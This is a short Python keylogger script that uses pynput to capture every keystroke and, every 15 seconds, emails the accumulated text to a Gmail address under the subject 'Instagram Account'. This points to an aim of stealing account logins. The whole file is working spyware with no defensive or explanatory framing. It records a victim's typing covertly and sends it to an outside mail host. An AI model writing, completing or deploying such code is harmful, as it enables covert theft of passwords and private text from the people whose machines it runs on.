import pynput.keyboard
import smtplib
from email.mime.text import MIMEText
from email.header import Header
from send_mail import send_mail
import threading

mon = ""

def keys(key):
    global mon
    try:
        mon = mon + str(key.char)
    except AttributeError:
        if key == key.space:
            mon = mon + " "
        elif key == key.enter:
            mon = mon + "\n"

    print(mon)

def thread():
    global mon
    send_mail("mail@gmail.com", "passwordforpy", "mail@gmail.com", "Instagram Account", mon)  
    mon = ""
    timer = threading.Timer(15, thread)
    timer.start()

if __name__ == "__main__":
    listener = pynput.keyboard.Listener(on_press=keys)

    with listener:
        thread()
        listener.join()
